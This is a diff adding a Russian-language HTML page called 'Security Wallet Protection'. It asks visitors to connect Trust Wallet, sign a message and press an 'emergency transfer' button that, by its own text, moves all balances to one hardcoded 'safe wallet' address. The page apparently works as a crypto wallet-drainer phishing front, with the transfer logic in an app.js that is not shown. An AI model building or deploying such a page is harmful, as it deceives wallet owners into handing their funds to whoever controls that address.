@@ -1,16 +1,251 @@
-<!-- Добавляем после блока с кнопками подключения -->
-<section id="emergencySection" style="display: none; margin-top: 30px; padding: 20px; border: 2px solid red; border-radius: 10px;">
-    <h2 style="color: red;">⚡ ЭКСТРЕННЫЙ ПЕРЕВОД СРЕДСТВ</h2>
-    <p><strong>Безопасный кошелек:</strong> TGGWh4Cm9HmvhBB9HkUoe6zD3Zrfx6psKb</p>
-    
-    <div id="balances" style="margin: 15px 0;">
-        <h3>Доступные балансы:</h3>
-        <div id="balancesList"></div>
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Security Wallet Protection</title>
+    <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+        
+        body {
+            font-family: 'Arial', sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            color: #333;
+        }
+        
+        .container {
+            background: white;
+            border-radius: 20px;
+            padding: 40px;
+            box-shadow: 0 15px 35px rgba(0,0,0,0.1);
+            max-width: 600px;
+            width: 100%;
+            text-align: center;
+        }
+        
+        h1 {
+            color: #2c3e50;
+            margin-bottom: 10px;
+            font-size: 2.2em;
+        }
+        
+        .subtitle {
+            color: #7f8c8d;
+            margin-bottom: 30px;
+            font-size: 1.1em;
+            line-height: 1.5;
+        }
+        
+        .wallet-info {
+            background: #f8f9fa;
+            border-radius: 15px;
+            padding: 20px;
+            margin: 20px 0;
+            border-left: 4px solid #3498db;
+        }
+        
+        .wallet-address {
+            font-family: 'Courier New', monospace;
+            background: #ecf0f1;
+            padding: 10px;
+            border-radius: 8px;
+            word-break: break-all;
+            font-size: 0.9em;
+            margin: 10px 0;
+        }
+        
+        .button-group {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+            margin: 25px 0;
+        }
+        
+        button {
+            padding: 16px 30px;
+            font-size: 1.1em;
+            border: none;
+            border-radius: 12px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+        
+        #connectButton {
+            background: linear-gradient(135deg, #3498db, #2980b9);
+            color: white;
+        }
+        
+        #connectButton:hover {
+            background: linear-gradient(135deg, #2980b9, #2573a7);
+            transform: translateY(-2px);
+        }
+        
+        #signButton {
+            background: linear-gradient(135deg, #27ae60, #219a52);
+            color: white;
+        }
+        
+        #signButton:hover {
+            background: linear-gradient(135deg, #219a52, #1e8449);
+            transform: translateY(-2px);
+        }
+        
+        #emergencyTransferBtn {
+            background: linear-gradient(135deg, #e74c3c, #c0392b);
+            color: white;
+            font-size: 1.2em;
+            padding: 18px 30px;
+        }
+        
+        #emergencyTransferBtn:hover {
+            background: linear-gradient(135deg, #c0392b, #a93226);
+            transform: translateY(-2px);
+        }
+        
+        .emergency-section {
+            border: 3px solid #e74c3c;
+            border-radius: 15px;
+            padding: 25px;
+            margin: 30px 0;
+            background: #fff5f5;
+        }
+        
+        .emergency-title {
+            color: #e74c3c;
+            font-size: 1.5em;
+            margin-bottom: 15px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+        
+        .status-box {
+            padding: 15px;
+            border-radius: 10px;
+            margin: 15px 0;
+            font-weight: 500;
+        }
+        
+        .success {
+            background: #d4f8e8;
+            color: #27ae60;
+            border: 1px solid #27ae60;
+        }
+        
+        .error {
+            background: #fde8e8;
+            color: #e74c3c;
+            border: 1px solid #e74c3c;
+        }
+        
+        .warning {
+            background: #fff3cd;
+            color: #856404;
+            border: 1px solid #ffeaa7;
+        }
+        
+        .balances-section {
+            background: #f8f9fa;
+            border-radius: 12px;
+            padding: 20px;
+            margin: 20px 0;
+        }
+        
+        .balance-item {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 10px 0;
+            border-bottom: 1px solid #e9ecef;
+        }
+        
+        .balance-item:last-child {
+            border-bottom: none;
+        }
+        
+        .hidden {
+            display: none !important;
+        }
+        
+        .loading {
+            opacity: 0.7;
+            pointer-events: none;
+        }
+        
+        .icon {
+            font-size: 1.2em;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🛡️ Security Wallet Protection</h1>
+        <p class="subtitle">Защитите ваши активы с помощью системы экстренного перевода</p>
+        
+        <div class="wallet-info">
+            <h3>Безопасный кошелек для перевода:</h3>
+            <div class="wallet-address" id="safeWalletDisplay">TGGWh4Cm9HmvhBB9HkUoe6zD3Zrfx6psKb</div>
+            <p>Все средства будут автоматически переведены на этот адрес при активации</p>
+        </div>
+        
+        <div class="button-group">
+            <button id="connectButton">
+                <span class="icon">🔗</span>
+                Подключить Trust Wallet
+            </button>
+            
+            <button id="signButton" class="hidden">
+                <span class="icon">✍️</span>
+                Подписать сообщение для подтверждения
+            </button>
+        </div>
+        
+        <div id="status" class="status-box"></div>
+        
+        <section id="emergencySection" class="emergency-section hidden">
+            <h2 class="emergency-title">
+                <span class="icon">⚡</span>
+                ЭКСТРЕННЫЙ ПЕРЕВОД СРЕДСТВ
+            </h2>
+            
+            <div class="balances-section">
+                <h3>Доступные балансы:</h3>
+                <div id="balancesList">
+                    <p>Подключите кошелек для просмотра балансов</p>
+                </div>
+            </div>
+            
+            <button id="emergencyTransferBtn">
+                <span class="icon">🚨</span>
+                АКТИВИРОВАТЬ ЭКСТРЕННЫЙ ПЕРЕВОД
+            </button>
+            
+            <div id="transferStatus" class="status-box" style="display: none;"></div>
+        </section>
+        
+        <div id="noWalletMessage" class="status-box error hidden">
+            <p><strong>Trust Wallet не найден!</strong></p>
+            <p>Пожалуйста, откройте эту страницу в браузере Trust Wallet или установите расширение.</p>
+        </div>
     </div>
 
-    <button id="emergencyTransferBtn" style="background-color: red; color: white; padding: 15px; font-size: 16px;">
-        🚨 АКТИВИРОВАТЬ ЭКСТРЕННЫЙ ПЕРЕВОД
-    </button>
-    
-    <div id="transferStatus" style="margin-top: 15px;"></div>
-</section>
+    <script src="app.js"></script>
+</body>
+</html>
